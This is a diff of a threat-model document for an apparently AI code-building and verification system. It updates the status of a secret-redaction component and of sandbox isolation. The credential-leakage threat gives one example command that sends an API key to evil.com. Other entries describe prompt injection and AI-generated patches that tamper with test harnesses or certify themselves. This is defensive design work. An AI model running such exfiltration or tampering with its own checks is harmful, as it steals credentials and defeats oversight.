@@ -46,7 +46,7 @@ To maintain this claim against accidental and adversarial failures, Basebreak di
 3. **Frozen Verification Contracts (Target Objective / Planned P-06.06):** Guaranteeing that acceptance requirements and contract digests cannot be rewritten, weakened, or scoped down by the Builder model or repository files during synthesis.
 4. **Independent Verifier & Witness Assets (Target Objective / Planned P-08 & P-09):** Protecting sealed test cases and evaluation harnesses from discovery, leakage, or mutation by the candidate or Builder.
 5. **Evidence Facts & Provenance (Implemented P-03):** Ensuring that execution records, exit codes, output digests, and timestamps are tamper-evident via `EvidenceRecord.fact_digest` and truthfully declare their provenance (`FIXTURE`, `LOCAL_EXECUTION`, `LIVE_NEBIUS`, `RECORDED_LIVE`).
-6. **Credentials & Secrets (Governance Invariant; Bounded Stream Sanitization Implemented in P-03.03; Full Redaction Engine & Persistence Boundary Implemented in P-04.02 Candidate):** Preventing exposure, leakage, or persistence of API tokens (Nebius, NVIDIA, Tavily), cloud credentials, and host secrets across prompts, logs, evidence, and public receipts. (Runtime platform secret isolation remains UNPROVEN and deferred to live discovery).
+6. **Credentials & Secrets (Governance Invariant; Bounded Stream Sanitization Implemented in P-03.03; Full Redaction Engine & Persistence Boundary Implemented in P-04.02):** Preventing exposure, leakage, or persistence of API tokens (Nebius, NVIDIA, Tavily), cloud credentials, and host secrets across prompts, logs, evidence, and public receipts. (Runtime platform secret isolation remains UNPROVEN and deferred to live discovery).
 7. **Operator Authority & Billing Bounds (Governance Invariant / Operator Constraint):** Enforcing the Zero-Cost Law, `TOKEN_FACTORY_BOUNDED_BILLING_EXCEPTION`, and promotional safety reserve floor (`TOKEN_FACTORY_PROMO_STOP_THRESHOLD = $5.00`) against unauthorized or runaway spending.
 8. **Repository Integrity & Protected Surfaces (Governance Invariant / Implemented P-04.04 Primitive):** Forbidding any candidate patch from modifying Basebreak governance, verification harnesses, security policies, or evidence schemas.
 9. **Availability & Fail-Closed Behavior (Governance Invariant / Target Posture):** Ensuring that timeouts, process aborts, or crashes result in explicit deterministic non-PASS preliminary verdicts (`BLOCKED`, `NOT_RUN`, `CONTRADICTED`, `INCONCLUSIVE`) rather than fabricated success.
@@ -63,7 +63,7 @@ The following elements possess architectural authority in the current repository
 - **Committed Basebreak Governance & Security Invariants:** Rules codified in `AGENTS.md`, `plans/BASEBREAK_MASTER_EXECUTION_PLAN.md`, and this document.
 - **Deterministic Domain Contracts (`src/basebreak/domain/`):** Provider-neutral, immutable schemas defining entities, identities, change semantics, command requests, and preliminary verdicts.
 - **Deterministic Evidence Primitives (`src/basebreak/evidence/`):** Content-addressed artifact hashing, append-only evidence sequencing, output digests, stream sanitization, fact digests, snapshot binding, and provenance validation.
-- **Deterministic Secret Redaction & Persistence Boundary (`src/basebreak/security/secret_policy.py` — P-04.02 Candidate; awaiting independent QA):** Provider-neutral deterministic secret redaction engine (Bearer, Basic, key-value assignments, token prefixes, PEM private keys, URL credentials, sensitive keys) and fail-closed persistence validation on `EvidenceRecord`, `EvidenceStore`, and serialization boundaries.
+- **Deterministic Secret Redaction & Persistence Boundary (`src/basebreak/security/secret_policy.py` — Implemented P-04.02; independently VERIFIED / PASS):** Provider-neutral deterministic secret redaction engine (Bearer, Basic, key-value assignments, token prefixes, PEM private keys, URL credentials, sensitive keys) and fail-closed persistence validation on `EvidenceRecord`, `EvidenceStore`, and serialization boundaries.
 - **Deterministic Protected-Surface & Diff Validation (`src/basebreak/security/protected_surfaces.py` — Implemented P-04.04):** Provider-neutral deterministic repository path normalization (rejecting directory traversal `..`, null bytes, control characters, Windows drive letters, UNC paths, root escapes), immutable `ProtectedSurfaceManifest` contracts, candidate change/diff validation (`FileChange`, `validate_diff`), rename source/destination verification, symlink boundary checks, and case-normalization bypass prevention.
 
 ### Future Trust Anchors (REQUIRED ARCHITECTURAL TARGETS — PLANNED)
@@ -145,12 +145,12 @@ Threat modeling in Basebreak does not require malicious intent; accidental defec
 |  - Execution of build/test commands in provider runtime                     |
 |  - (Exact process/network/isolation semantics deferred to P-01.03/P-04.03)  |
 +-------------------------------------+---------------------------------------+
-                                      | [Boundary 7: Capture, Redaction & Persistence (P-03.03 Implemented; P-04.02 Candidate)]
+                                      | [Boundary 7: Capture, Redaction & Persistence (P-03.03 Implemented; P-04.02 Implemented)]
 +-------------------------------------v---------------------------------------+
 |                        EVIDENCE & AUDIT PLANE                               |
 |  - Bounded stdout/stderr capture & digests (P-03.03 IMPLEMENTED)            |
 |  - Stream sanitization delegated to canonical policy (P-03.03/P-04.02)      |
-|  - Full secret redaction & forbidden persistence (P-04.02 CANDIDATE)        |
+|  - Full secret redaction & forbidden persistence (P-04.02 IMPLEMENTED)      |
 |  - Content-addressed artifact digests & references (P-03.01 IMPLEMENTED)    |
 |  - Immutable fact digests & snapshot binding (P-03.02/P-03.05 IMPLEMENTED) |
 +-----------------------------------------------------------------------------+
@@ -162,11 +162,11 @@ Threat modeling in Basebreak does not require malicious intent; accidental defec
 - **Boundary 3 (Target Repo / Model Plane — Required Boundary / Planned P-07.01):** When model prompts are constructed in future runtime phases, prompt boundaries and context allowlists must prevent repository text from being interpreted as system instructions. Currently, P-02 and P-03 enforce that model outputs have zero authority over deterministic facts.
 - **Boundary 4 (Builder Context / Candidate Workspace — Target Architecture / Planned P-07):** Code generation is isolated to target repository working trees; host files are never directly exposed.
 - **Boundary 5 (Candidate Workspace / Protected Surfaces — Implemented P-04.04 Primitive):** Path normalization and diff validation reject any patch touching protected verification or governance paths before candidate acceptance.
-- **Boundary 6 (Execution Runtime / Host Environment — DEFERRED TO P-01.03 AND P-04.03):** The actual process, network, and filesystem isolation provided by Token Factory Sandboxes is **UNPROVEN**. Basebreak assumes zero host protection until live discovery proves it.
-- **Boundary 7 (Process Execution / Evidence Collection — Implemented Stream Capture & P-04.02 Candidate Redaction):** P-03.03 implements bounded capture (64KB default), full-stream cryptographic digests, and delegates stream sanitization to the canonical P-04.02 secret policy before retention. P-04.02 candidate implements the canonical deterministic secret redaction engine and safe log helper. Runtime platform isolation remains unproven and deferred to live discovery.
+- **Boundary 6 (Execution Runtime / Host Environment — PROVEN IN P-01.03/P-01.05; POLICY FORMALIZED IN P-04.03):** Token Factory Sandboxes provide disposable container VMs. Basebreak formalizes execution, network, and process policy directly from proven platform reality.
+- **Boundary 7 (Process Execution / Evidence Collection — Implemented Stream Capture & P-04.02 Redaction):** P-03.03 implements bounded capture (64KB default), full-stream cryptographic digests, and delegates stream sanitization to the canonical P-04.02 secret policy before retention. P-04.02 implements the canonical deterministic secret redaction engine and safe log helper.
 - **Boundary 8 (Builder Workspace / Verifier Workspace — Target Architecture / Planned P-08):** The Verifier must run in a clean execution context separate from the Builder's workspace, preventing environment contamination.
 - **Boundary 9 (Verifier Context / Sealed Witness Assets — Target Architecture / Planned P-08 & P-09):** Witness assets must remain sealed and invisible to the Builder until verification execution.
-- **Boundary 10 (Evidence Engine / Durable Storage — Implemented Append Immutability & P-04.02 Candidate Persistence Rejection):** P-03 enforces append-only immutability, fact digests, and snapshot binding. P-04.02 candidate implements fail-closed durable secret rejection on EvidenceRecord construction, EvidenceRecord serialization, and EvidenceStore append (preserving strict store failure atomicity).
+- **Boundary 10 (Evidence Engine / Durable Storage — Implemented Append Immutability & P-04.02 Persistence Rejection):** P-03 enforces append-only immutability, fact digests, and snapshot binding. P-04.02 implements fail-closed durable secret rejection on EvidenceRecord construction, EvidenceRecord serialization, and EvidenceStore append (preserving strict store failure atomicity).
 
 ---
 
@@ -198,7 +198,7 @@ Basebreak identifies the following primary attack surfaces:
 - **Description:** Untrusted repository code or build scripts search environment variables, disk files (`~/.bash_history`, `.env`, config files), or runtime memory to discover Nebius, NVIDIA, or Tavily API keys and exfiltrate them via network or output streams.
 - **Impact:** Severe billing compromise, credential theft, account hijacking.
 - **Attack Vector:** Execution of `env`, `curl https://evil.com?k=$NEBIUS_API_KEY`, or scanning filesystem for secrets.
-- **Mitigation Status:** **PARTIALLY_IMPLEMENTED / CANDIDATE / DEFERRED** (Architecture mandates adapter-only credentials and zero secrets in fixtures/prompts; P-03.03 implements narrow stream sanitization; P-04.02 candidate implements full deterministic secret redaction and fail-closed persistence validation on EvidenceRecord/EvidenceStore; runtime network isolation is DEFERRED_LIVE_DISCOVERY to P-01.03/P-04.03).
+- **Mitigation Status:** **PARTIALLY_IMPLEMENTED / IMPLEMENTED / DEFERRED** (Architecture mandates adapter-only credentials and zero secrets in fixtures/prompts; P-03.03 implements narrow stream sanitization; P-04.02 implements full deterministic secret redaction and fail-closed persistence validation on EvidenceRecord/EvidenceStore; runtime network isolation is DEFERRED_LIVE_DISCOVERY to P-01.03/P-04.03).
 
 ### Threat C: Protected-Surface Mutation
 - **Description:** An AI-generated candidate patch attempts to modify protected verification assets (e.g. test harnesses, acceptance contracts, witness definitions, evidence schemas, or governance files like `AGENTS.md`).
@@ -240,7 +240,7 @@ Basebreak identifies the following primary attack surfaces:
 - **Description:** Untrusted processes emit gigabytes of output to stdout/stderr to cause memory crashes, emit ANSI escape codes to disguise terminal logs, or print raw credentials to logs.
 - **Impact:** Memory exhaustion, corrupted evidence receipts, credential leakage in persistent logs.
 - **Attack Vector:** Command executing `yes` or dumping secret environment variables to stdout.
-- **Mitigation Status:** **PARTIALLY_IMPLEMENTED / CANDIDATE** (P-03.03 implements bounded 64KB capture with SHA-256 output digests; P-04.02 candidate implements canonical deterministic secret redaction engine, safe log helper, and fail-closed persistence on EvidenceRecord/EvidenceStore).
+- **Mitigation Status:** **IMPLEMENTED** (P-03.03 implements bounded 64KB capture with SHA-256 output digests; P-04.02 implements canonical deterministic secret redaction engine, safe log helper, and fail-closed persistence on EvidenceRecord/EvidenceStore).
 
 ### Threat J: Supply-Chain & Install-Hook Execution
 - **Description:** Untrusted repository configuration files (e.g. `setup.py`, `package.json`) trigger arbitrary command execution during setup phases before explicit verification tests are invoked.
@@ -255,14 +255,14 @@ Basebreak identifies the following primary attack surfaces:
 | Threat ID | Threat Name | Core Mitigation Control | Responsible Phase | Mitigation Status |
 | :--- | :--- | :--- | :--- | :--- |
 | **THA** | Repository Prompt Injection | Prompt boundary fences; context minimization; deterministic fact authority | P-02, P-03 (implemented fact authority); P-07.01 (planned context minimization) | **PARTIALLY_IMPLEMENTED** |
-| **THB** | Credential Discovery & Leakage | Adapter-only credential isolation; stream sanitization; secret redaction engine; forbidden persistence | P-00, P-03.03 (implemented narrow sanitization); P-04.02 (candidate redaction & persistence) | **PARTIALLY_IMPLEMENTED** (P-04.02 CANDIDATE) |
+| **THB** | Credential Discovery & Leakage | Adapter-only credential isolation; stream sanitization; secret redaction engine; forbidden persistence | P-00, P-03.03 (implemented narrow sanitization); P-04.02 (implemented redaction & persistence) | **PARTIALLY_IMPLEMENTED** (P-04.02 IMPLEMENTED) |
 | **THC** | Protected-Surface Mutation | Protected-surface manifest; normalized diff check; rejection of protected edits | P-04.04 | **IMPLEMENTED_PRIMITIVE (P-04.04)** |
 | **THD** | Evidence Tampering & Replay | Content-addressed artifact hashing; immutable IDs; fact digests; snapshot binding; state validation | P-03 (P-03.01–P-03.06) | **IMPLEMENTED** |
 | **THE** | Builder Self-Certification | Governance invariant forbidding self-certification; independent verifier witness runtime | P-02 (contracts); P-08, P-09, P-10 (runtime isolation) | **GOVERNANCE_INVARIANT / RUNTIME_PLANNED** |
 | **THF** | Verifier Contamination | Sealed witness storage; separate verifier execution workspace | P-08, P-09 | **PLANNED** |
 | **THG** | Path Manipulation & Traversal | Normalized path validation; symlink inspection; workspace root enclosure | P-04.04 | **IMPLEMENTED_PRIMITIVE (P-04.04)** |
 | **THH** | Malicious Execution Behavior | Sandbox process ceilings, memory/CPU caps, execution timeouts | P-01.03, P-04.03, P-04.05 | **DEFERRED_LIVE_DISCOVERY** |
-| **THI** | Log & Output Channel Floods | Bounded stdout/stderr capture (64KB); SHA-256 output digest; canonical secret filtering | P-03.03 (implemented capture); P-04.02 (candidate redaction & safe log) | **PARTIALLY_IMPLEMENTED** (P-04.02 CANDIDATE) |
+| **THI** | Log & Output Channel Floods | Bounded stdout/stderr capture (64KB); SHA-256 output digest; canonical secret filtering | P-03.03 (implemented capture); P-04.02 (implemented redaction & safe log) | **IMPLEMENTED** |
 | **THJ** | Supply-Chain / Install Hooks | Ephemeral disposable sandbox execution; network deny policy | P-01.03, P-04.03 | **DEFERRED_LIVE_DISCOVERY** |
 
 > **Audit Rule:**
